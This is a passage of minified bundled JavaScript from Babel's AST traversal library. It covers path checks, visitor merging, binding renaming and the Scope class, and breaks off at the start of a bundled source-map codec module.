xB1(X)&&FG(X,J)}function dB1(){let{node:X,parent:J}=this,Q=this.parentPath.parent;return PM(X)&&IB1(X,J,Q)}function iB1(){let{node:X,parent:J}=this;if(gB1(X)){if(yB1(X)){if(EB1(J,{left:X}))return!1;if(_B1(J,{init:X}))return!1}return!0}else return!1}function rB1(){if(this.isIdentifier())return this.isReferencedIdentifier();else return SB1(this.node)}function nB1(){return fB1(this.node,this.parent)}function aB1(){return FG(this.node,this.parent)}function sB1(){return CB1(this.node)}function oB1(){return hB1(this.node)}function tB1(){return this.node&&!!this.node.loc}function eB1(){return!this.isUser()}function Xq1(X){return this.scope.isPure(this.node,X)}function Jq1(){let{node:X}=this;if(TB1(X))return!0;else if($B1(X))return X.importKind==="type"||X.importKind==="typeof";else if(PB1(X))return X.exportKind==="type";else if(kB1(X))return X.importKind==="type"||X.importKind==="typeof";else return!1}function Qq1(){var X;return SM(this.node)&&((X=this.parentPath)==null?void 0:X.isObjectPattern())}function Yq1(){var X;return SM(this.node)&&((X=this.parentPath)==null?void 0:X.isObjectExpression())}function Wq1(){return uB1(this.node,{await:!0})}TM.isExistentialTypeParam=function X(){throw new Error("`path.isExistentialTypeParam` has been renamed to `path.isExistsTypeAnnotation()` in Babel 7.")},TM.isNumericLiteralTypeAnnotation=function X(){throw new Error("`path.isNumericLiteralTypeAnnotation()` has been renamed to `path.isNumberLiteralTypeAnnotation()` in Babel 7.")}});var _4=c((cM)=>{Object.defineProperty(cM,"__esModule",{value:!0});cM.environmentVisitor=Tq1;cM.explode=yM;cM.isExplodedVisitor=hM;cM.merge=uM;cM.verify=mM;var gM=HW(),Lq1=jG(),Dq1=U0(),_M=P8(),{DEPRECATED_KEYS:EM,DEPRECATED_ALIASES:$M,FLIPPED_ALIAS_KEYS:kM,TYPES:wq1,__internal__deprecationWarning:bM}=Dq1;function Iq1(X){return X in gM}function hM(X){return X==null?void 0:X._exploded}function yM(X){if(hM(X))return X;X._exploded=!0;for(let J of Object.keys(X)){if(vX(J))continue;let Q=J.split("|");if(Q.length===1)continue;let Y=X[J];delete X[J];for(let W of Q)X[W]=Y}mM(X),delete X.__esModule,Cq1(X),fM(X);for(let J of Object.keys(X)){if(vX(J))continue;if(!Iq1(J))continue;let Q=X[J];for(let W of Object.keys(Q))Q[W]=Pq1(J,Q[W]);delete X[J];let Y=gM[J];if(Y!==null)for(let W of Y)if(X[W])x5(X[W],Q);else X[W]=Q;else x5(X,Q)}for(let J of Object.keys(X)){if(vX(J))continue;let Q=kM[J];if(J in EM){let W=EM[J];bM(J,W,"Visitor "),Q=[W]}else if(J in $M){let W=$M[J];bM(J,W,"Visitor "),Q=kM[W]}if(!Q)continue;let Y=X[J];delete X[J];for(let W of Q){let z=X[W];if(z)x5(z,Y);else X[W]=Object.assign({},Y)}}for(let J of Object.keys(X)){if(vX(J))continue;fM(X[J])}return X}function mM(X){if(X._verified)return;if(typeof X==="function")throw new Error("You passed `traverse()` a function when it expected a visitor object, are you sure you didn't mean `{ enter: Function }`?");for(let J of Object.keys(X)){if(J==="enter"||J==="exit")vM(J,X[J]);if(vX(J))continue;if(!wq1.includes(J))throw new Error(`You gave us a visitor for the node type ${J} but it's not a valid type in @babel/traverse 7.28.4`);let Q=X[J];if(typeof Q==="object")for(let Y of Object.keys(Q))if(Y==="enter"||Y==="exit")vM(`${J}.${Y}`,Q[Y]);else throw new Error(`You passed \`traverse()\` a visitor object with the property ${J} that has the invalid property ${Y}`)}X._verified=!0}function vM(X,J){let Q=[].concat(J);for(let Y of Q)if(typeof Y!=="function")throw new TypeError(`Non-function found defined in ${X} with type ${typeof Y}`)}function uM(X,J=[],Q){let Y={_verified:!0,_exploded:!0};Object.defineProperty(Y,"_exploded",{enumerable:!1}),Object.defineProperty(Y,"_verified",{enumerable:!1});for(let W=0;W<X.length;W++){let z=yM(X[W]),G=J[W],H=z;if(G||Q)H=xM(H,G,Q);x5(Y,H);for(let U of Object.keys(z)){if(vX(U))continue;let K=z[U];if(G||Q)K=xM(K,G,Q);let V=Y[U]||(Y[U]={});x5(V,K)}}return Y}function xM(X,J,Q){let Y={};for(let W of["enter","exit"]){let z=X[W];if(!Array.isArray(z))continue;z=z.map(function(G){let H=G;if(J)H=function(U){G.call(J,U,J)};if(Q)H=Q(J==null?void 0:J.key,W,H);if(H!==G)H.toString=()=>G.toString();return H}),Y[W]=z}return Y}function Cq1(X){for(let J of Object.keys(X)){if(vX(J))continue;let Q=X[J];if(typeof Q==="function")X[J]={enter:Q}}}function fM(X){if(X.enter&&!Array.isArray(X.enter))X.enter=[X.enter];if(X.exit&&!Array.isArray(X.exit))X.exit=[X.exit]}function Pq1(X,J){let Q=`is${X}`,Y=Lq1[Q],W=function(z){if(Y.call(z))return J.apply(this,arguments)};return W.toString=()=>J.toString(),W}function vX(X){if(X[0]==="_")return!0;if(X==="enter"||X==="exit"||X==="shouldSkip")return!0;if(X==="denylist"||X==="noScope"||X==="skipKeys")return!0;if(X==="blacklist")return!0;return!1}function x5(X,J){for(let Q of["enter","exit"]){if(!J[Q])continue;X[Q]=[].concat(X[Q]||[],J[Q])}}var Sq1={FunctionParent(X){if(X.isArrowFunctionExpression())return;if(X.skip(),X.isMethod())if(!X.requeueComputedKeyAndDecorators)_M.requeueComputedKeyAndDecorators.call(X);else X.requeueComputedKeyAndDecorators()},Property(X){if(X.isObjectProperty())return;if(X.skip(),!X.requeueComputedKeyAndDecorators)_M.requeueComputedKeyAndDecorators.call(X);else X.requeueComputedKeyAndDecorators()}};function Tq1(X){return uM([Sq1,X])}});var iM=c((pM)=>{Object.defineProperty(pM,"__esModule",{value:!0});pM.default=void 0;var E4=U0(),vq1=E4,xq1=$4(),fq1=_4(),gq1=P8(),{getAssignmentIdentifiers:hq1}=vq1,yq1={ReferencedIdentifier({node:X},J){if(X.name===J.oldName)X.name=J.newName},Scope(X,J){if(!X.scope.bindingIdentifierEquals(J.oldName,J.binding.identifier)){if(X.skip(),X.isMethod())if(!X.requeueComputedKeyAndDecorators)gq1.requeueComputedKeyAndDecorators.call(X);else X.requeueComputedKeyAndDecorators()}},ObjectProperty({node:X,scope:J},Q){let{name:Y}=X.key;if(X.shorthand&&(Y===Q.oldName||Y===Q.newName)&&J.getBindingIdentifier(Y)===Q.binding.identifier){X.shorthand=!1;{var W;if((W=X.extra)!=null&&W.shorthand)X.extra.shorthand=!1}}},"AssignmentExpression|Declaration|VariableDeclarator"(X,J){if(X.isVariableDeclaration())return;let Q=X.isAssignmentExpression()?hq1(X.node):X.getOuterBindingIdentifiers();for(let Y in Q)if(Y===J.oldName)Q[Y].name=J.newName}};class lM{constructor(X,J,Q){this.newName=Q,this.oldName=J,this.binding=X}maybeConvertFromExportDeclaration(X){let J=X.parentPath;if(!J.isExportDeclaration())return;if(J.isExportDefaultDeclaration()){let{declaration:Q}=J.node;if(E4.isDeclaration(Q)&&!Q.id)return}if(J.isExportAllDeclaration())return;J.splitExportDeclaration()}maybeConvertFromClassFunctionDeclaration(X){return X}maybeConvertFromClassFunctionExpression(X){return X}rename(){let{binding:X,oldName:J,newName:Q}=this,{scope:Y,path:W}=X,z=W.find((U)=>U.isDeclaration()||U.isFunctionExpression()||U.isClassExpression());if(z){if(z.getOuterBindingIdentifiers()[J]===X.identifier)this.maybeConvertFromExportDeclaration(z)}let G=arguments[0]||Y.block,H={discriminant:!0};if(E4.isMethod(G)){if(G.computed)H.key=!0;if(!E4.isObjectMethod(G))H.decorators=!0}if(xq1.traverseNode(G,fq1.explode(yq1),Y,this,Y.path,H),!arguments[0])Y.removeOwnBinding(J),Y.bindings[Q]=X,this.binding.identifier.name=Q;if(z)this.maybeConvertFromClassFunctionDeclaration(W),this.maybeConvertFromClassFunctionExpression(W)}}pM.default=lM});var sM=c((nM)=>{Object.defineProperty(nM,"__esModule",{value:!0});nM.default=void 0;class rM{constructor({identifier:X,scope:J,path:Q,kind:Y}){if(this.identifier=void 0,this.scope=void 0,this.path=void 0,this.kind=void 0,this.constantViolations=[],this.constant=!0,this.referencePaths=[],this.referenced=!1,this.references=0,this.identifier=X,this.scope=J,this.path=Q,this.kind=Y,(Y==="var"||Y==="hoisted")&&mq1(Q))this.reassign(Q);this.clearValue()}deoptValue(){this.clearValue(),this.hasDeoptedValue=!0}setValue(X){if(this.hasDeoptedValue)return;this.hasValue=!0,this.value=X}clearValue(){this.hasDeoptedValue=!1,this.hasValue=!1,this.value=null}reassign(X){if(this.constant=!1,this.constantViolations.includes(X))return;this.constantViolations.push(X)}reference(X){if(this.referencePaths.includes(X))return;this.referenced=!0,this.references++,this.referencePaths.push(X)}dereference(){this.references--,this.referenced=!!this.references}}nM.default=rM;function mq1(X){let J=!X.isVariableDeclarator()||X.node.init;for(let{parentPath:Q,key:Y}=X;Q;{parentPath:Q,key:Y}=Q){if(Q.isFunctionParent())return!1;if(Y==="left"&&Q.isForXStatement()||J&&Y==="body"&&Q.isLoop())return!0}return!1}});var xX=c((eM)=>{Object.defineProperty(eM,"__esModule",{value:!0});eM.clear=cq1;eM.clearPath=oM;eM.clearScope=tM;eM.getCachedPaths=lq1;eM.getOrCreateCachedPaths=pq1;eM.scope=eM.path=void 0;var k4=eM.path=new WeakMap,uq1=eM.scope=new WeakMap;function cq1(){oM(),tM()}function oM(){eM.path=k4=new WeakMap}function tM(){eM.scope=uq1=new WeakMap}function lq1(X){let{parent:J,parentPath:Q}=X;return k4.get(J)}function pq1(X,J){let Q=k4.get(X);if(!Q)k4.set(X,Q=new Map);return Q}});var JF=c((U10,sq1)=>{sq1.exports=["decodeURI","decodeURIComponent","encodeURI","encodeURIComponent","escape","eval","globalThis","isFinite","isNaN","parseFloat","parseInt","undefined","unescape"]});var QF=c((K10,oq1)=>{oq1.exports=["AggregateError","Array","ArrayBuffer","Atomics","BigInt","BigInt64Array","BigUint64Array","Boolean","DataView","Date","Error","EvalError","FinalizationRegistry","Float16Array","Float32Array","Float64Array","Function","Infinity","Int16Array","Int32Array","Int8Array","Intl","Iterator","JSON","Map","Math","NaN","Number","Object","Promise","Proxy","RangeError","ReferenceError","Reflect","RegExp","Set","SharedArrayBuffer","String","Symbol","SyntaxError","TypeError","Uint16Array","Uint32Array","Uint8Array","Uint8ClampedArray","URIError","WeakMap","WeakRef","WeakSet"]});var LG=c((RF)=>{Object.defineProperty(RF,"__esModule",{value:!0});RF.default=void 0;var tq1=iM(),BF=g5(),eq1=sM(),qF=U0(),ZF=qF,YF=xX(),XZ1=JF(),JZ1=QF(),{assignmentExpression:QZ1,callExpression:WF,cloneNode:GF,getBindingIdentifiers:MF,identifier:gX,isArrayExpression:FF,isBinary:YZ1,isCallExpression:zF,isClass:WZ1,isClassBody:GZ1,isClassDeclaration:zZ1,isExportAllDeclaration:jF,isExportDefaultDeclaration:HZ1,isExportNamedDeclaration:RG,isFunctionDeclaration:UZ1,isIdentifier:fX,isImportDeclaration:AG,isLiteral:KZ1,isMemberExpression:VZ1,isMethod:BZ1,isModuleSpecifier:qZ1,isNullLiteral:ZZ1,isObjectExpression:MZ1,isProperty:FZ1,isPureish:jZ1,isRegExpLiteral:OZ1,isSuper:RZ1,isTaggedTemplateExpression:AZ1,isTemplateLiteral:OF,isThisExpression:HF,isUnaryExpression:NZ1,isVariableDeclaration:LZ1,expressionStatement:DZ1,matchesPattern:UF,memberExpression:NG,numericLiteral:wZ1,toIdentifier:IZ1,variableDeclaration:CZ1,variableDeclarator:PZ1,isRecordExpression:SZ1,isTupleExpression:TZ1,isObjectProperty:_Z1,isTopicReference:KF,isMetaProperty:EZ1,isPrivateName:$Z1,isExportDeclaration:kZ1,buildUndefinedNode:bZ1,sequenceExpression:vZ1}=qF;function v0(X,J){switch(X==null?void 0:X.type){default:if(AG(X)||kZ1(X)){var Q;if((jF(X)||RG(X)||AG(X))&&X.source)v0(X.source,J);else if((RG(X)||AG(X))&&(Q=X.specifiers)!=null&&Q.length)for(let Y of X.specifiers)v0(Y,J);else if((HZ1(X)||RG(X))&&X.declaration)v0(X.declaration,J)}else if(qZ1(X))v0(X.local,J);else if(KZ1(X)&&!ZZ1(X)&&!OZ1(X)&&!OF(X))J.push(X.value);break;case"MemberExpression":case"OptionalMemberExpression":case"JSXMemberExpression":v0(X.object,J),v0(X.property,J);break;case"Identifier":case"JSXIdentifier":J.push(X.name);break;case"CallExpression":case"OptionalCallExpression":case"NewExpression":v0(X.callee,J);break;case"ObjectExpression":case"ObjectPattern":for(let Y of X.properties)v0(Y,J);break;case"SpreadElement":case"RestElement":v0(X.argument,J);break;case"ObjectProperty":case"ObjectMethod":case"ClassProperty":case"ClassMethod":case"ClassPrivateProperty":case"ClassPrivateMethod":v0(X.key,J);break;case"ThisExpression":J.push("this");break;case"Super":J.push("super");break;case"Import":case"ImportExpression":J.push("import");break;case"DoExpression":J.push("do");break;case"YieldExpression":J.push("yield"),v0(X.argument,J);break;case"AwaitExpression":J.push("await"),v0(X.argument,J);break;case"AssignmentExpression":v0(X.left,J);break;case"VariableDeclarator":v0(X.id,J);break;case"FunctionExpression":case"FunctionDeclaration":case"ClassExpression":case"ClassDeclaration":v0(X.id,J);break;case"PrivateName":v0(X.id,J);break;case"ParenthesizedExpression":v0(X.expression,J);break;case"UnaryExpression":case"UpdateExpression":v0(X.argument,J);break;case"MetaProperty":v0(X.meta,J),v0(X.property,J);break;case"JSXElement":v0(X.openingElement,J);break;case"JSXOpeningElement":v0(X.name,J);break;case"JSXFragment":v0(X.openingFragment,J);break;case"JSXOpeningFragment":J.push("Fragment");break;case"JSXNamespacedName":v0(X.namespace,J),v0(X.name,J);break}}function VF(X){X.references=Object.create(null),X.uids=Object.create(null),X.bindings=Object.create(null),X.globals=Object.create(null)}b4=Symbol.for("should not be considered a local binding");var b4,xZ1={ForStatement(X){let J=X.get("init");if(J.isVar()){let{scope:Q}=X;(Q.getFunctionParent()||Q.getProgramParent()).registerBinding("var",J)}},Declaration(X){if(X.isBlockScoped())return;if(X.isImportDeclaration())return;if(X.isExportDeclaration())return;(X.scope.getFunctionParent()||X.scope.getProgramParent()).registerDeclaration(X)},ImportDeclaration(X){X.scope.getBlockParent().registerDeclaration(X)},TSImportEqualsDeclaration(X){X.scope.getBlockParent().registerDeclaration(X)},ReferencedIdentifier(X,J){if(ZF.isTSQualifiedName(X.parent)&&X.parent.right===X.node)return;if(X.parentPath.isTSImportEqualsDeclaration())return;J.references.push(X)},ForXStatement(X,J){let Q=X.get("left");if(Q.isPattern()||Q.isIdentifier())J.constantViolations.push(X);else if(Q.isVar()){let{scope:Y}=X;(Y.getFunctionParent()||Y.getProgramParent()).registerBinding("var",Q)}},ExportDeclaration:{exit(X){let{node:J,scope:Q}=X;if(jF(J))return;let Y=J.declaration;if(zZ1(Y)||UZ1(Y)){let W=Y.id;if(!W)return;let z=Q.getBinding(W.name);z==null||z.reference(X)}else if(LZ1(Y))for(let W of Y.declarations)for(let z of Object.keys(MF(W))){let G=Q.getBinding(z);G==null||G.reference(X)}}},LabeledStatement(X){X.scope.getBlockParent().registerDeclaration(X)},AssignmentExpression(X,J){J.assignments.push(X)},UpdateExpression(X,J){J.constantViolations.push(X)},UnaryExpression(X,J){if(X.node.operator==="delete")J.constantViolations.push(X)},BlockScoped(X){let J=X.scope;if(J.path===X)J=J.parent;if(J.getBlockParent().registerDeclaration(X),X.isClassDeclaration()&&X.node.id){let W=X.node.id.name;X.scope.bindings[W]=X.scope.parent.getBinding(W)}},CatchClause(X){X.scope.registerBinding("let",X)},Function(X){let J=X.get("params");for(let Q of J)X.scope.registerBinding("param",Q);if(X.isFunctionExpression()&&X.node.id&&!X.node.id[b4])X.scope.registerBinding("local",X.get("id"),X)},ClassExpression(X){if(X.node.id&&!X.node.id[b4])X.scope.registerBinding("local",X.get("id"),X)},TSTypeAnnotation(X){X.skip()}},f5,fZ1=0;class G8{constructor(X){this.uid=void 0,this.path=void 0,this.block=void 0,this.inited=void 0,this.labels=void 0,this.bindings=void 0,this.referencesSet=void 0,this.globals=void 0,this.uidsSet=void 0,this.data=void 0,this.crawling=void 0;let{node:J}=X,Q=YF.scope.get(J);if((Q==null?void 0:Q.path)===X)return Q;YF.scope.set(J,this),this.uid=fZ1++,this.block=J,this.path=X,this.labels=new Map,this.inited=!1,Object.defineProperties(this,{references:{enumerable:!0,configurable:!0,writable:!0,value:Object.create(null)},uids:{enumerable:!0,configurable:!0,writable:!0,value:Object.create(null)}})}get parent(){var X;let J,Q=this.path;do{var Y;let W=Q.key==="key"||Q.listKey==="decorators";if(Q=Q.parentPath,W&&Q.isMethod())Q=Q.parentPath;if((Y=Q)!=null&&Y.isScope())J=Q}while(Q&&!J);return(X=J)==null?void 0:X.scope}get references(){throw new Error("Scope#references is not available in Babel 8. Use Scope#referencesSet instead.")}get uids(){throw new Error("Scope#uids is not available in Babel 8. Use Scope#uidsSet instead.")}generateDeclaredUidIdentifier(X){let J=this.generateUidIdentifier(X);return this.push({id:J}),GF(J)}generateUidIdentifier(X){return gX(this.generateUid(X))}generateUid(X="temp"){X=IZ1(X).replace(/^_+/,"").replace(/\d+$/g,"");let J,Q=0;do{if(J=`_${X}`,Q>=11)J+=Q-1;else if(Q>=9)J+=Q-9;else if(Q>=1)J+=Q+1;Q++}while(this.hasLabel(J)||this.hasBinding(J)||this.hasGlobal(J)||this.hasReference(J));let Y=this.getProgramParent();return Y.references[J]=!0,Y.uids[J]=!0,J}generateUidBasedOnNode(X,J){let Q=[];v0(X,Q);let Y=Q.join("$");return Y=Y.replace(/^_/,"")||J||"ref",this.generateUid(Y.slice(0,20))}generateUidIdentifierBasedOnNode(X,J){return gX(this.generateUidBasedOnNode(X,J))}isStatic(X){if(HF(X)||RZ1(X)||KF(X))return!0;if(fX(X)){let J=this.getBinding(X.name);if(J)return J.constant;else return this.hasBinding(X.name)}return!1}maybeGenerateMemoised(X,J){if(this.isStatic(X))return null;else{let Q=this.generateUidIdentifierBasedOnNode(X);if(!J)return this.push({id:Q}),GF(Q);return Q}}checkBlockScopedCollisions(X,J,Q,Y){if(J==="param")return;if(X.kind==="local")return;if(J==="let"||X.kind==="let"||X.kind==="const"||X.kind==="module"||X.kind==="param"&&J==="const")throw this.path.hub.buildError(Y,`Duplicate declaration "${Q}"`,TypeError)}rename(X,J){let Q=this.getBinding(X);if(Q)J||(J=this.generateUidIdentifier(X).name),new tq1.default(Q,X,J).rename(arguments[2])}dump(){let X="-".repeat(60);console.log(X);let J=this;do{console.log("#",J.block.type);for(let Q of Object.keys(J.bindings)){let Y=J.bindings[Q];console.log(" -",Q,{constant:Y.constant,references:Y.references,violations:Y.constantViolations.length,kind:Y.kind})}}while(J=J.parent);console.log(X)}hasLabel(X){return!!this.getLabel(X)}getLabel(X){return this.labels.get(X)}registerLabel(X){this.labels.set(X.node.label.name,X)}registerDeclaration(X){if(X.isLabeledStatement())this.registerLabel(X);else if(X.isFunctionDeclaration())this.registerBinding("hoisted",X.get("id"),X);else if(X.isVariableDeclaration()){let J=X.get("declarations"),{kind:Q}=X.node;for(let Y of J)this.registerBinding(Q==="using"||Q==="await using"?"const":Q,Y)}else if(X.isClassDeclaration()){if(X.node.declare)return;this.registerBinding("let",X)}else if(X.isImportDeclaration()){let J=X.node.importKind==="type"||X.node.importKind==="typeof",Q=X.get("specifiers");for(let Y of Q){let W=J||Y.isImportSpecifier()&&(Y.node.importKind==="type"||Y.node.importKind==="typeof");this.registerBinding(W?"unknown":"module",Y)}}else if(X.isExportDeclaration()){let J=X.get("declaration");if(J.isClassDeclaration()||J.isFunctionDeclaration()||J.isVariableDeclaration())this.registerDeclaration(J)}else this.registerBinding("unknown",X)}buildUndefinedNode(){return bZ1()}registerConstantViolation(X){let J=X.getAssignmentIdentifiers();for(let Y of Object.keys(J)){var Q;(Q=this.getBinding(Y))==null||Q.reassign(X)}}registerBinding(X,J,Q=J){if(!X)throw new ReferenceError("no `kind`");if(J.isVariableDeclaration()){let z=J.get("declarations");for(let G of z)this.registerBinding(X,G);return}let Y=this.getProgramParent(),W=J.getOuterBindingIdentifiers(!0);for(let z of Object.keys(W)){Y.references[z]=!0;for(let G of W[z]){let H=this.getOwnBinding(z);if(H){if(H.identifier===G)continue;this.checkBlockScopedCollisions(H,X,z,G)}if(H)H.reassign(Q);else this.bindings[z]=new eq1.default({identifier:G,scope:this,path:Q,kind:X})}}}addGlobal(X){this.globals[X.name]=X}hasUid(X){{let J=this;do if(J.uids[X])return!0;while(J=J.parent);return!1}}hasGlobal(X){let J=this;do if(J.globals[X])return!0;while(J=J.parent);return!1}hasReference(X){return!!this.getProgramParent().references[X]}isPure(X,J){if(fX(X)){let z=this.getBinding(X.name);if(!z)return!1;if(J)return z.constant;return!0}else if(HF(X)||EZ1(X)||KF(X)||$Z1(X))return!0;else if(WZ1(X)){var Q;if(X.superClass&&!this.isPure(X.superClass,J))return!1;if(((Q=X.decorators)==null?void 0:Q.length)>0)return!1;return this.isPure(X.body,J)}else if(GZ1(X)){for(let z of X.body)if(!this.isPure(z,J))return!1;return!0}else if(YZ1(X))return this.isPure(X.left,J)&&this.isPure(X.right,J);else if(FF(X)||TZ1(X)){for(let z of X.elements)if(z!==null&&!this.isPure(z,J))return!1;return!0}else if(MZ1(X)||SZ1(X)){for(let z of X.properties)if(!this.isPure(z,J))return!1;return!0}else if(BZ1(X)){var Y;if(X.computed&&!this.isPure(X.key,J))return!1;if(((Y=X.decorators)==null?void 0:Y.length)>0)return!1;return!0}else if(FZ1(X)){var W;if(X.computed&&!this.isPure(X.key,J))return!1;if(((W=X.decorators)==null?void 0:W.length)>0)return!1;if(_Z1(X)||X.static){if(X.value!==null&&!this.isPure(X.value,J))return!1}return!0}else if(NZ1(X))return this.isPure(X.argument,J);else if(OF(X)){for(let z of X.expressions)if(!this.isPure(z,J))return!1;return!0}else if(AZ1(X))return UF(X.tag,"String.raw")&&!this.hasBinding("String",{noGlobals:!0})&&this.isPure(X.quasi,J);else if(VZ1(X))return!X.computed&&fX(X.object)&&X.object.name==="Symbol"&&fX(X.property)&&X.property.name!=="for"&&!this.hasBinding("Symbol",{noGlobals:!0});else if(zF(X))return UF(X.callee,"Symbol.for")&&!this.hasBinding("Symbol",{noGlobals:!0})&&X.arguments.length===1&&ZF.isStringLiteral(X.arguments[0]);else return jZ1(X)}setData(X,J){return this.data[X]=J}getData(X){let J=this;do{let Q=J.data[X];if(Q!=null)return Q}while(J=J.parent)}removeData(X){let J=this;do if(J.data[X]!=null)J.data[X]=null;while(J=J.parent)}init(){if(!this.inited)this.inited=!0,this.crawl()}crawl(){let X=this.path;VF(this),this.data=Object.create(null);let J=this;do{if(J.crawling)return;if(J.path.isProgram())break}while(J=J.parent);let Q=J,Y={references:[],constantViolations:[],assignments:[]};if(this.crawling=!0,f5||(f5=BF.default.visitors.merge([{Scope(W){VF(W.scope)}},xZ1])),X.type!=="Program"){for(let z of f5.enter)z.call(Y,X,Y);let W=f5[X.type];if(W)for(let z of W.enter)z.call(Y,X,Y)}X.traverse(f5,Y),this.crawling=!1;for(let W of Y.assignments){let z=W.getAssignmentIdentifiers();for(let G of Object.keys(z)){if(W.scope.getBinding(G))continue;Q.addGlobal(z[G])}W.scope.registerConstantViolation(W)}for(let W of Y.references){let z=W.scope.getBinding(W.node.name);if(z)z.reference(W);else Q.addGlobal(W.node)}for(let W of Y.constantViolations)W.scope.registerConstantViolation(W)}push(X){let J=this.path;if(J.isPattern())J=this.getPatternParent().path;else if(!J.isBlockStatement()&&!J.isProgram())J=this.getBlockParent().path;if(J.isSwitchStatement())J=(this.getFunctionParent()||this.getProgramParent()).path;let{init:Q,unique:Y,kind:W="var",id:z}=X;if(!Q&&!Y&&(W==="var"||W==="let")&&J.isFunction()&&!J.node.name&&zF(J.parent,{callee:J.node})&&J.parent.arguments.length<=J.node.params.length&&fX(z)){J.pushContainer("params",z),J.scope.registerBinding("param",J.get("params")[J.node.params.length-1]);return}if(J.isLoop()||J.isCatchClause()||J.isFunction())J.ensureBlock(),J=J.get("body");let G=X._blockHoist==null?2:X._blockHoist,H=`declaration:${W}:${G}`,U=!Y&&J.getData(H);if(!U){let B=CZ1(W,[]);if(B._blockHoist=G,[U]=J.unshiftContainer("body",[B]),!Y)J.setData(H,U)}let K=PZ1(z,Q),V=U.node.declarations.push(K);J.scope.registerBinding(W,U.get("declarations")[V-1])}getProgramParent(){let X=this;do if(X.path.isProgram())return X;while(X=X.parent);throw new Error("Couldn't find a Program")}getFunctionParent(){let X=this;do if(X.path.isFunctionParent())return X;while(X=X.parent);return null}getBlockParent(){let X=this;do if(X.path.isBlockParent())return X;while(X=X.parent);throw new Error("We couldn't find a BlockStatement, For, Switch, Function, Loop or Program...")}getPatternParent(){let X=this;do if(!X.path.isPattern())return X.getBlockParent();while(X=X.parent.parent);throw new Error("We couldn't find a BlockStatement, For, Switch, Function, Loop or Program...")}getAllBindings(){let X=Object.create(null),J=this;do{for(let Q of Object.keys(J.bindings))if(Q in X===!1)X[Q]=J.bindings[Q];J=J.parent}while(J);return X}bindingIdentifierEquals(X,J){return this.getBindingIdentifier(X)===J}getBinding(X){let J=this,Q;do{let W=J.getOwnBinding(X);if(W){var Y;if((Y=Q)!=null&&Y.isPattern()&&W.kind!=="param"&&W.kind!=="local");else return W}else if(!W&&X==="arguments"&&J.path.isFunction()&&!J.path.isArrowFunctionExpression())break;Q=J.path}while(J=J.parent)}getOwnBinding(X){return this.bindings[X]}getBindingIdentifier(X){var J;return(J=this.getBinding(X))==null?void 0:J.identifier}getOwnBindingIdentifier(X){let J=this.bindings[X];return J==null?void 0:J.identifier}hasOwnBinding(X){return!!this.getOwnBinding(X)}hasBinding(X,J){if(!X)return!1;let Q,Y,W;if(typeof J==="object")Q=J.noGlobals,Y=J.noUids,W=J.upToScope;else if(typeof J==="boolean")Q=J;let z=this;do{if(W===z)break;if(z.hasOwnBinding(X))return!0}while(z=z.parent);if(!Y&&this.hasUid(X))return!0;if(!Q&&G8.globals.includes(X))return!0;if(!Q&&G8.contextVariables.includes(X))return!0;return!1}parentHasBinding(X,J){var Q;return(Q=this.parent)==null?void 0:Q.hasBinding(X,J)}moveBindingTo(X,J){let Q=this.getBinding(X);if(Q)Q.scope.removeOwnBinding(X),Q.scope=J,J.bindings[X]=Q}removeOwnBinding(X){delete this.bindings[X]}removeBinding(X){var J;(J=this.getBinding(X))==null||J.scope.removeOwnBinding(X);{let Q=this;do if(Q.uids[X])Q.uids[X]=!1;while(Q=Q.parent)}}hoistVariables(X=(J)=>this.push({id:J})){this.crawl();let J=new Set;for(let Q of Object.keys(this.bindings)){let Y=this.bindings[Q];if(!Y)continue;let{path:W}=Y;if(!W.isVariableDeclarator())continue;let{parent:z,parentPath:G}=W;if(z.kind!=="var"||J.has(z))continue;J.add(W.parent);let H,U=[];for(let K of z.declarations){if(H!=null||(H=K.id),K.init)U.push(QZ1("=",K.id,K.init));let V=Object.keys(MF(K,!1,!0,!0));for(let B of V)X(gX(B),K.init!=null)}if(G.parentPath.isFor({left:z}))G.replaceWith(H);else if(U.length===0)G.remove();else{let K=U.length===1?U[0]:vZ1(U);if(G.parentPath.isForStatement({init:z}))G.replaceWith(K);else G.replaceWith(DZ1(K))}}}}RF.default=G8;G8.globals=[...XZ1,...JZ1];G8.contextVariables=["arguments","undefined","Infinity","NaN"];G8.prototype._renameFromMap=function X(J,Q,Y,W){if(J[Q])J[Y]=W,J[Q]=null},G8.prototype.traverse=function(X,J,Q){BF.default(X,J,this,Q,this.path)},G8.prototype._generateUid=function X(J,Q){let Y=J;if(Q>1)Y+=Q;return`_${Y}`},G8.prototype.toArray=function X(J,Q,Y){if(fX(J)){let G=this.getBinding(J.name);if(G!=null&&G.constant&&G.path.isGenericType("Array"))return J}if(FF(J))return J;if(fX(J,{name:"arguments"}))return WF(NG(NG(NG(gX("Array"),gX("prototype")),gX("slice")),gX("call")),[J]);let W,z=[J];if(Q===!0)W="toConsumableArray";else if(typeof Q==="number")z.push(wZ1(Q)),W="slicedToArray";else W="toArray";if(Y)z.unshift(this.path.hub.addHelper(W)),W="maybeArrayLike";return WF(this.path.hub.addHelper(W),z)},G8.prototype.getAllBindingsOfKind=function X(...J){let Q=Object.create(null);for(let Y of J){let W=this;do{for(let z of Object.keys(W.bindings)){let G=W.bindings[z];if(G.kind===Y)Q[z]=G}W=W.parent}while(W)}return Q},Object.defineProperties(G8.prototype,{parentBlock:{configurable:!0,enumerable:!0,get(){return this.path.parent}},hub:{configurable:!0,enumerable:!0,get(){return this.path.hub}}})});var wG=c((DG,h5)=>{(function(X,J){if(typeof DG==="object"&&typeof h5!=="undefined")J(h5),h5.exports=Q(h5);else if(typeof define==="function"&&define.amd)define(["module"],function(Y){J.apply(this,arguments),Y.exports=Q(Y)});else{let Y={exports:{}};J(Y),X=typeof globalThis!=="undefined"?globalThis:X||self,X.sourcemapCodec=Q(Y)}function Q(Y){return"default"in Y.exports?Y.exports.default:Y.exports}})(DG,function(X){var{defineProperty:J,getOwnPropertyDescriptor:Q,getOwnPropertyNames:Y}=Object,W=Object.prototype.hasOwnProperty,z=(d,Q1)=>{for(var u in Q1)J(d,u,{get:Q1[u],enumerable:!0})},G=(d,Q1,u,z1)=>{if(Q1&&typeof Q1==="object"||typeof Q1==="function"){for(let B1 of Y(Q1))if(!W.call(d,B1)&&B1!==u)J(d,B1,{get:()=>Q1[B1],enumerable:!(z1=Q(Q1,B1))||z1.enumerable})}return d},H=(d)=>G(J({},"__esModule",{value:!0}),d),U={};z(U,{decode:()=>m,decodeGeneratedRanges:()=>y,decodeOriginalScopes:()=>T,encode:()=>H1,encodeGeneratedRanges:()=>a,encodeOriginalScopes:()=>k}),X.exports=H(U);var 